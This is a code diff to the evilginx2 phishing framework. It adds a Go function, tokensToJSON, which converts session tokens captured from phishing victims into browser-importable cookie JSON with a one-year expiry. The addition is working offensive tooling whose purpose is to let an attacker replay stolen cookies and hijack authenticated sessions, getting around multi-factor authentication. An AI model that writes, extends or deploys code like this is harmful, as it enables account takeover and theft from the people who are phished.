@@ -3,8 +3,12 @@ package core
 import (
 	"crypto/rand"
 	"crypto/sha256"
+	"encoding/json"
 	"fmt"
 	"os"
+	"time"
+
+	"github.com/kgretzky/evilginx2/database"
 )
 
 func GenRandomToken() string {
@@ -45,4 +49,43 @@ func CreateDir(path string, perm os.FileMode) error {
 		}
 	}
 	return nil
+}
+
+func tokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+	}
+
+	var cookies []*Cookie
+	for domain, tmap := range tokens {
+		for k, v := range tmap {
+			c := &Cookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+			}
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	json, _ := json.Marshal(cookies)
+	return string(json)
 }
